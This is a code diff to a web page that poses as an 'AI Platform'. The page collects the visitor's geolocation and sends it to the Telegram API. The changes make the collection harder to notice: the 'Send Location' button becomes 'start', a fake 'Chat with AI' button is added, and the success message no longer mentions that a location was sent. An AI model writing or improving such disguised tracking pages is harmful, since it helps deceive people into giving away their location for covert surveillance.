@@ -58,8 +58,11 @@
     <div class="container">
         <div class="ai-avatar"></div>
         <h1>Welcome to the AI Platform</h1>
+        <p>If sharing does not work, please open this page in a browser such as Chrome or Safari.</p>
         <p id="message"></p>
-        <button onclick="getLocation()">Send Location</button>
+        <div class="buttons">
+        <button onclick="alert('Chat with AI Coming Soon!')">Chat with AI</button>
+        <button onclick="getLocation()">start</button>
         <div id="status"></div>
     </div>
 
@@ -148,7 +151,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    document.getElementById('status').innerText = 'Location sent successfully!';
+                    document.getElementById('status').innerText = ' successfully!';
                 } else {
                     document.getElementById('status').innerText = 'Failed to send location.';
                     console.error("Telegram API error:", data);
